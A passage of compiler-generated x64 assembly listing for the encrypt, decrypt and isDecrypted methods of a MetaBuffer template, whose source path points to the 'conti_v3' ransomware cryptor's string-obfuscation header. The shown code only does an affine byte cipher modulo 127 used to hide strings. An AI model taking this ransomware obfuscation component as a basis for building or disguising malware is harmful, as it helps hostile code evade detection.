; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 13
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+19]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 18 00 00 00	 mov	 ecx, 24
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3e	 imul	 r8d, ecx, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 18	 add	 r8d, 24
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 39	 sub	 eax, 57			; 00000039H
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 39	 add	 r8d, 57			; 00000039H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 4c	 sub	 eax, 76			; 0000004cH
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4c	 add	 r8d, 76			; 0000004cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 27	 sub	 eax, 39			; 00000027H
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 27	 add	 r8d, 39			; 00000027H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1e 00 00 00	 mov	 ecx, 30
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1e	 add	 r8d, 30
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
